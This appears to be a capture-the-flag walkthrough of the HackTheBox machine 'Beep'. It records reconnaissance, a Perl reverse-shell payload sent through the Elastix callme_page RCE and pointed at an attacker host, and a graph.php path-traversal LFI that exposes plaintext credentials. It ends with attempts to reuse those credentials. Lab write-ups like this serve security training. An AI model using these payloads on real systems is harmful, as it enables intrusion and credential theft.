---
layout: page
title: Beep
description: Exploited Elastix LFI vulnerability.
img: 
importance: 4
category: HackTheBox
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/beep/logo.png" title="HTB Beep" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Beep">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Let's dial in on some vulnerabilities.  Time to tackle Beep. 

Let's run nmap and try to identify some sweet, juicy services.

{% capture nmap %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.129.229.183                 
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 14:58 +1100
Nmap scan report for 10.129.229.183
Host is up (0.32s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.129.229.183/
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            854/udp   status
|_  100024  1            857/tcp   status
143/tcp   open  imap?
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_http-server-header: Apache/2.2.3 (CentOS)
|_ssl-date: 2026-01-17T04:03:21+00:00; +8s from scanner time.
|_http-title: Elastix - Login page
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Aggressive OS guesses: Linux 2.6.18 - 2.6.24 (97%), Linux 2.6.5 - 2.6.12 (96%), Linux 2.6.18 (95%), Linux 2.6.9 - 2.6.24 (95%), Linux 2.6.9 - 2.6.30 (95%), Linux 2.6.27 (likely embedded) (95%), Linux 2.6.20 (95%), Linux 2.6.27 (95%), Linux 2.6.30 (95%), Linux 2.6.8 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: 127.0.0.1

Host script results:
|_clock-skew: 7s

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   332.89 ms 10.10.14.1
2   332.96 ms 10.129.229.183

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 562.99 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
TCP is half the battle.  Run nmap against UDP to see the other major protocol.

{% capture nmapfull %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ sudo nmap -sU -sV 10.129.229.183                                
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 15:01 +1100
Nmap scan report for 10.129.229.183
Host is up (0.32s latency).
Not shown: 993 closed udp ports (port-unreach)
PORT      STATE         SERVICE VERSION
68/udp    open|filtered dhcpc
69/udp    open          tftp    Netkit tftpd or atftpd
111/udp   open          rpcbind 2 (RPC #100000)
123/udp   open          ntp     NTP v4 (secondary server)
5000/udp  open|filtered upnp
5060/udp  open|filtered sip
10000/udp open          webmin  (https on TCP port 10000)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1176.80 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmapfull %}

<br />
Look-up the Webmin in exploit-db and find an exploit.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/beep/exploitone.png" title="Webmin Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/1997">https://www.exploit-db.com/exploits/1997</a>

<br />
Download the exploit.

{% capture downloadexploit %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ wget https://www.exploit-db.com/raw/1997 -O webmin.php                                                           
--2026-01-17 15:51:28--  https://www.exploit-db.com/raw/1997
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1434 (1.4K) [text/plain]
Saving to: ‘webmin.php’

webmin.php                                                 100%[========================================================================================================================================>]   1.40K  --.-KB/s    in 0s      

2026-01-17 15:51:29 (45.2 MB/s) - ‘webmin.php’ saved [1434/1434]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadexploit %}

<br />
Attempt to run the exploit and fail miserably.

{% capture exploitfail %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ php webmin.php 10.129.229.183 10000 https /etc/shadow
Attacking 10.129.229.183
---------------------------------
---------------------------------
Coded by joffer , http://securitydot.net

# milw0rm.com [2006-07-09]                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ php webmin.php 10.129.229.183 10000 https /etc/shadow\n
Attacking 10.129.229.183
---------------------------------
---------------------------------
Coded by joffer , http://securitydot.net

# milw0rm.com [2006-07-09]                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ php webmin.php 10.129.229.183 10000 https /etc/passwd  
Attacking 10.129.229.183
---------------------------------
---------------------------------
Coded by joffer , http://securitydot.net
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=exploitfail %}

<br />
Curl the server on port 80 with the `-I` to pull the headers to try and identify technology.

{% capture curli80 %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ curl -I http://10.129.229.183
HTTP/1.1 302 Found
Date: Sat, 17 Jan 2026 04:57:32 GMT
Server: Apache/2.2.3 (CentOS)
Location: https://10.129.229.183/
Connection: close
Content-Type: text/html; charset=iso-8859-1
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curli80 %}

<br />
Run the same curl for the https.

{% capture curli443 %}
┌──(kali㉿kali)-[~]
└─$ curl -I -k --tls-max 1.0 https://10.129.229.183
HTTP/1.1 200 OK
Date: Sat, 17 Jan 2026 05:06:29 GMT
Server: Apache/2.2.3 (CentOS)
X-Powered-By: PHP/5.1.6
Set-Cookie: elastixSession=a66vo2p6103i7v02e5o0c0q1b0; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curli443 %}

<br />
Check the landing page for the server on port 443.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/beep/landingpage.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the source code for the landing page.

{% capture landingpagesourcecode %}
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
	<title>Elastix - Login page</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<!--<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">-->
	<link rel="stylesheet" href="themes/elastixneo/login_styles.css">
  </head>
  <body>
	<form method="POST">
	  <div id="neo-login-box">
		<div id="neo-login-logo">
		  <img src="themes/elastixneo/images/elastix_logo_mini.png" width="200" height="62" alt="elastix logo" />
		</div>
		<div class="neo-login-line">
		  <div class="neo-login-label">Username:</div>
		  <div class="neo-login-inputbox"><input type="text" id="input_user" name="input_user" class="neo-login-input" /></div>
		</div>
		<div class="neo-login-line">
		  <div class="neo-login-label">Password:</div>
		  <div class="neo-login-inputbox"><input type="password" name="input_pass" class="neo-login-input" /></div>
		</div>
		<div class="neo-login-line">
		  <div class="neo-login-label"></div>
		  <div class="neo-login-inputbox"><input type="submit" name="submit_login" value="Submit" class="neo-login-submit" /></div>
		</div>
		<div class="neo-footernote"><a href="http://www.elastix.org" style="text-decoration: none;" target='_blank'>Elastix</a> is licensed under <a href="http://www.opensource.org/licenses/gpl-license.php" style="text-decoration: none;" target='_blank'>GPL</a> by <a href="http://www.palosanto.com" style="text-decoration: none;" target='_blank'>PaloSanto Solutions</a>. 2006 - 2026.</div>
		<br>
		<script type="text/javascript">
			document.getElementById("input_user").focus();
		</script>
	  </div>
	</form>
  </body>
</html>
{% endcapture %}
{% include terminal.html language='browser' title='view-source:https://10.129.229.183' content=landingpagesourcecode %}

<br />
Check the exploit-db for Elastix and check what it has.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/beep/elastixexploit.png" title="elastixexploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/18650">https://www.exploit-db.com/exploits/18650</a>

<br />
Download the Elastix exploit.

{% capture downloadelastix %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ wget https://www.exploit-db.com/raw/18650 -O exploit.py                                                          
--2026-01-17 16:23:05--  https://www.exploit-db.com/raw/18650
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1908 (1.9K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   1.86K  --.-KB/s    in 0s      

2026-01-17 16:23:06 (60.3 MB/s) - ‘exploit.py’ saved [1908/1908]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadelastix %}

<br />
Update the python script to output the url string.

{% capture updatepython %}
#!/usr/bin/python
############################################################
# Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit
# Google Dork: oy vey
# Date: March 23rd, 2012
# Author: muts, SSL update by Emporeo
# Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.
# Tested on: multiple
# CVE : notyet
# Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ 
# Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt
############################################################
# Discovered by Martin Tschirsich
# http://seclists.org/fulldisclosure/2012/Mar/234
# http://www.exploit-db.com/exploits/18649
############################################################

rhost="10.129.229.183"
lhost="10.10.14.120"
lport=443
extension="1000"

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

print(url)
{% endcapture %}
{% include terminal.html language='python' title='exploit.py' content=updatepython %}

<br />
Start a netcat listener.

{% capture nclistener %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nclistener %}

<br />
Run the exploit and note the payload.

{% capture getpayload %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ python3 exploit.py                                                                    
https://10.129.229.183/recordings/misc/callme_page.php?action=c&callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.120%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=getpayload %}

<br />
Try the url payload.  Check the listener.  Fail.

{% capture getpayload %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ curl -k --tls-max 1.0 https://10.129.229.183/recordings/misc/callme_page.php?action=c&callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.120%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
[1] 2864
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <TITLE>Voicemail Message Call Me Control</TITLE>
    <link rel="stylesheet" href="../theme/main.css" type="text/css">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  </head>

<table class='voicemail' style='width: 100%; height: 100%; margin: 0 0 0 0; border: 0px; padding: 0px'><tr><td valign='middle' style='border: 0px'></td></tr></table><script language='javascript'>parent.document.getElementById('callme_status').innerHTML = 'The call failed.  Perhaps the line was busy.';</script><script language='javascript'>parent.document.getElementById('pb_load_inprogress').value='false';</script><script language='javascript'>parent.document.getElementById('callme_status').parentNode.style.backgroundColor = 'white';</script>  </body>
</html>


[1]  + done       curl -k --tls-max 1.0 
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=getpayload %}

<br />
Check the Elastix in searchsploit and notice the graph.php LFI exploit.

{% capture searchsploit %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ searchsploit elastix                                            
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                                                                                                                     | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                                   | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                             | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                                                                          | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                                                                                                         | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                                                                                                                        | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                                                    | php/webapps/18650.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=searchsploit %}

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/beep/lfiexploit.png" title="LFI Exploit" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/37637">https://www.exploit-db.com/exploits/37637</a>

<br />
Run the exploit to pull the amportal.conf file.

{% capture lficonfig %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ curl -k --tls-max 1.0 'https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action'
# This file is part of FreePBX.
#
#    FreePBX is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 2 of the License, or
#    (at your option) any later version.
#
#    FreePBX is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with FreePBX.  If not, see <http://www.gnu.org/licenses/>.
#
# This file contains settings for components of the Asterisk Management Portal
# Spaces are not allowed!
# Run /usr/src/AMP/apply_conf.sh after making changes to this file

# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

# AMPBIN: Location of the FreePBX command line scripts
# AMPSBIN: Location of (root) command line scripts
#
AMPBIN=/var/lib/asterisk/bin
AMPSBIN=/usr/local/sbin

# AMPWEBROOT: Path to Apache's webroot (leave off trailing slash)
# AMPCGIBIN: Path to Apache's cgi-bin dir (leave off trailing slash)
# AMPWEBADDRESS: The IP address or host name used to access the AMP web admin
#
AMPWEBROOT=/var/www/html
AMPCGIBIN=/var/www/cgi-bin 
# AMPWEBADDRESS=x.x.x.x|hostname

# FOPWEBROOT: Path to the Flash Operator Panel webroot (leave off trailing slash)
# FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
# FOPRUN: Set to true if you want FOP started by freepbx_engine (amportal_start), false otherwise
# FOPDISABLE: Set to true to disable FOP in interface and retrieve_conf.  Useful for sqlite3 
# or if you don't want FOP.
#
#FOPRUN=true
FOPWEBROOT=/var/www/html/panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

# FOPSORT=extension|lastname
# DEFAULT VALUE: extension
# FOP should sort extensions by Last Name [lastname] or by Extension [extension]

# This is the default admin name used to allow an administrator to login to ARI bypassing all security.
# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
ARI_ADMIN_USERNAME=admin

# This is the default admin password to allow an administrator to login to ARI bypassing all security.
# Change this to a secure password.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE

# AUTHTYPE=database|none
# Authentication type to use for web admininstration. If type set to 'database', the primary
# AMP admin credentials will be the AMPDBUSER/AMPDBPASS above.
AUTHTYPE=database

# AMPADMINLOGO=filename
# Defines the logo that is to be displayed at the TOP RIGHT of the admin screen. This enables
# you to customize the look of the administration screen.
# NOTE: images need to be saved in the ..../admin/images directory of your AMP install
# This image should be 55px in height
AMPADMINLOGO=logo.png

# USECATEGORIES=true|false
# DEFAULT VALUE: true
# Controls if the menu items in the admin interface are sorted by category (true), or sorted 
# alphabetically with no categories shown (false).

# AMPEXTENSIONS=extensions|deviceanduser
# Sets the extension behavior in FreePBX.  If set to 'extensions', Devices and Users are
# administered together as a unified Extension, and appear on a single page.
# If set to 'deviceanduser', Devices and Users will be administered seperately.  Devices (e.g. 
# each individual line on a SIP phone) and Users (e.g. '101') will be configured 
# independent of each other, allowing association of one User to many Devices, or allowing 
# Users to login and logout of Devices.
AMPEXTENSIONS=extensions

# ENABLECW=true|false
ENABLECW=no
# DEFAULT VALUE: true
# Enable call waiting by default when an extension is created. Set to 'no' to if you don't want 
# phones to be commissioned with call waiting already enabled. The user would then be required
# to dial the CW feature code (*70 default) to enable their phone. Most installations should leave
# this alone. It allows multi-line phones to receive multiple calls on their line appearances.

# CWINUSEBUSY=true|false
# DEFAULT VALUE: true
# For extensions that have CW enabled, report unanswered CW calls as 'busy' (resulting in busy 
# voicemail greeting). If set to no, unanswered CW calls simply report as 'no-answer'.

# AMPBADNUMBER=true|false
# DEFAULT VALUE: true
# Generate the bad-number context which traps any bogus number or feature code and plays a
# message to the effect. If you use the Early Dial feature on some Grandstream phones, you
# will want to set this to false.

# AMPBACKUPSUDO=true|false
# DEFAULT VALUE: false
# This option allows you to use sudo when backing up files. Useful ONLY when using AMPPROVROOT
# Allows backup and restore of files specified in AMPPROVROOT, based on permissions in /etc/sudoers
# for example, adding the following to sudoers would allow the user asterisk to run tar on ANY file
# on the system:
#       asterisk localhost=(root)NOPASSWD: /bin/tar
#       Defaults:asterisk !requiretty
# PLEASE KEEP IN MIND THE SECURITY RISKS INVOLVED IN ALLOWING THE ASTERISK USER TO TAR/UNTAR ANY FILE

# CUSTOMASERROR=true|false
# DEFAULT VALUE: true
# If false, then the Destination Registry will not report unknown destinations as errors. This should be
# left to the default true and custom destinations should be moved into the new custom apps registry.

# DYNAMICHINTS=true|false
# DEFAULT VALUE: false
# If true, Core will not statically generate hints, but instead make a call to the AMPBIN php script, 
# and generate_hints.php through an Asterisk's #exec call. This requires Asterisk.conf to be configured 
# with "execincludes=yes" set in the [options] section.

# XTNCONFLICTABORT=true|false
# BADDESTABORT=true|false
# DEFAULT VALUE: false
# Setting either of these to true will result in retrieve_conf aborting during a reload if an extension
# conflict is detected or a destination is detected. It is usually better to allow the reload to go
# through and then correct the problem but these can be set if a more strict behavior is desired.

# SERVERINTITLE=true|false
# DEFAULT VALUE: false
# Precede browser title with the server name.

# USEDEVSTATE = true|false
# DEFAULT VALUE: false
# If this is set, it assumes that you are running Asterisk 1.4 or higher and want to take advantage of the
# func_devstate.c backport available from Asterisk 1.6. This allows custom hints to be created to support
# BLF for server side feature codes such as daynight, followme, etc.

# MODULEADMINWGET=true|false
# DEFAULT VALUE: false
# Module Admin normally tries to get its online information through direct file open type calls to URLs that
# go back to the freepbx.org server. If it fails, typically because of content filters in firewalls that
# don't like the way PHP formats the requests, the code will fall back and try a wget to pull the information.
# This will often solve the problem. However, in such environment there can be a significant timeout before
# the failed file open calls to the URLs return and there are often 2-3 of these that occur. Setting this
# value will force FreePBX to avoid the attempt to open the URL and go straight to the wget calls.

# AMPDISABLELOG=true|false
# DEFAULT VALUE: true
# Whether or not to invoke the FreePBX log facility

# AMPSYSLOGLEVEL=LOG_EMERG|LOG_ALERT|LOG_CRIT|LOG_ERR|LOG_WARNING|LOG_NOTICE|LOG_INFO|LOG_DEBUG|LOG_SQL|SQL
# DEFAULT VALUE: LOG_ERR
# Where to log if enabled, SQL, LOG_SQL logs to old MySQL table, others are passed to syslog system to
# determine where to log

# AMPENABLEDEVELDEBUG=true|false
# DEFAULT VALUE: false
# Whether or not to include log messages marked as 'devel-debug' in the log system

# AMPMPG123=true|false 
# DEFAULT VALUE: true
# When set to false, the old MoH behavior is adopted where MP3 files can be loaded and WAV files converted
# to MP3. The new default behavior assumes you have mpg123 loaded as well as sox and will convert MP3 files
# to WAV. This is highly recommended as MP3 files heavily tax the system and can cause instability on a busy
# phone system.

# CDR DB Settings: Only used if you don't use the default values provided by FreePBX.
# CDRDBHOST: hostname of db server if not the same as AMPDBHOST
# CDRDBPORT: Port number for db host 
# CDRDBUSER: username to connect to db with if it's not the same as AMPDBUSER
# CDRDBPASS: password for connecting to db if it's not the same as AMPDBPASS
# CDRDBNAME: name of database used for cdr records
# CDRDBTYPE: mysql or postgres mysql is default
# CDRDBTABLENAME: Name of the table in the db where the cdr is stored cdr is default 

# AMPVMUMASK=mask 
# DEFAULT VALUE: 077 
# Defaults to 077 allowing only the asterisk user to have any permission on VM files. If set to something
# like 007, it would allow the group to have permissions. This can be used if setting apache to a different
# user then asterisk, so that the apache user (and thus ARI) can have access to read/write/delete the
# voicemail files. If changed, some of the voicemail directory structures may have to be manually changed.

# DASHBOARD_STATS_UPDATE_TIME=integer_seconds
# DEFAULT VALUE: 6
# DASHBOARD_INFO_UPDATE_TIME=integer_seconds
# DEFAULT VALUE: 20
# These can be used to change the refresh rate of the System Status Panel. Most of
# the stats are updated based on the STATS interval but a few items are checked
# less frequently (such as Asterisk Uptime) based on the INFO value

# ZAP2DAHDICOMPAT=true|false
ZAP2DAHDICOMPAT=true
# DEFAULT VALUE: false
# If set to true, FreePBX will check if you have chan_dadhi installed. If so, it will
# automatically use all your ZAP configuration settings (devices and trunks) and
# silently convert them, under the covers, to DAHDI so no changes are needed. The
# GUI will continue to refer to these as ZAP but it will use the proper DAHDI channels.
# This will also keep Zap Channel DIDs working.

# CHECKREFERER=true|false
# DEFAULT VALUE: true
# When set to the default value of true, all requests into FreePBX that might possibly add/edit/delete
# settings will be validated to assure the request is coming from the server. This will protect the system
# from CSRF (cross site request forgery) attacks. It will have the effect of preventing legitimately entering
# URLs that could modify settings which can be allowed by changing this field to false.

# USEQUEUESTATE=true|false
# DEFAULT VALUE: false
# Setting this flag will generate the required dialplan to integrate with the following Asterisk patch:
# https://issues.asterisk.org/view.php?id=15168
# This feature is planned for a future 1.6 release but given the existence of the patch can be used prior. Once
# the release version is known, code will be added to automatically enable this format in versions of Asterisk
# that support it.

# USEGOOGLEDNSFORENUM=true|false
# DEFAULT VALUE: false
# Setting this flag will generate the required global variable so that enumlookup.agi will use Google DNS
# 8.8.8.8 when performing an ENUM lookup. Not all DNS deals with NAPTR record, but Google does. There is a
# drawback to this as Google tracks every lookup. If you are not comfortable with this, do not enable this
# setting. Please read Google FAQ about this: http://code.google.com/speed/public-dns/faq.html#privacy

# MOHDIR=subdirectory_name
# This is the subdirectory for the MoH files/directories which is located in ASTVARLIBDIR
# if not specified it will default to mohmp3 for backward compatibility.
MOHDIR=mohmp3
# RELOADCONFIRM=true|false
# DEFAULT VALUE: true
# When set to false, will bypass the confirm on Reload Box

# FCBEEPONLY=true|false
# DEFAULT VALUE: false
# When set to true, a beep is played instead of confirmation message when activating/de-activating:
# CallForward, CallWaiting, DayNight, DoNotDisturb and FindMeFollow

# DISABLECUSTOMCONTEXTS=true|false
# DEFAULT VALUE: false
# Normally FreePBX auto-generates a custom context that may be usable for adding custom dialplan to modify the
# normal behavior of FreePBX. It takes a good understanding of how Asterisk processes these includes to use
# this and in many of the cases, there is no useful application. All includes will result in a WARNING in the
# Asterisk log if there is no context found to include though it results in no errors. If you know that you
# want the includes, you can set this to true. If you comment it out FreePBX will revert to legacy behavior
# and include the contexts.

# AMPMODULEXML lets you change the module repository that you use. By default, it
# should be set to http://mirror.freepbx.org/ - Presently, there are no third
# party module repositories.
AMPMODULEXML=http://mirror.freepbx.org/

# AMPMODULESVN is the prefix that is appended to <location> tags in the XML file.
# This should be set to http://mirror.freepbx.org/modules/
AMPMODULESVN=http://mirror.freepbx.org/modules/

AMPDBNAME=asterisk

ASTETCDIR=/etc/asterisk
ASTMODDIR=/usr/lib/asterisk/modules
ASTVARLIBDIR=/var/lib/asterisk
ASTAGIDIR=/var/lib/asterisk/agi-bin
ASTSPOOLDIR=/var/spool/asterisk
ASTRUNDIR=/var/run/asterisk
ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=lficonfig %}

<br />
Notice the credentials in the file.

{% capture snagpassword %}

<snip>

AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

<snip>

{% endcapture %}
{% include terminal.html language='bash' title='bash' content=snagpassword %}

<br />
Try to ssh into the machine with the credentials.

{% capture basessh %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa \
    -oPubkeyAcceptedAlgorithms=+ssh-rsa \
> asteriskuser@10.129.229.183

The authenticity of host '10.129.229.183 (10.129.229.183)' can't be established.
RSA key fingerprint is: SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.183' (RSA) to the list of known hosts.
asteriskuser@10.129.229.183's password: 
Permission denied, please try again.
asteriskuser@10.129.229.183's password:
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=basessh %}

<br />
Try to authenticate into the database with the db credentials.

{% capture dblogin %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ mysql -h 10.129.229.183 -u asteriskuser -p 
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '10.10.14.120' is not allowed to connect to this MySQL server
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=dblogin %}

<br />
Try to ssh into the machine as root with the password from the config.

{% capture sshroot %}
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ mysql -h 10.129.229.183 -u asteriskuser -p 
Enter password: 
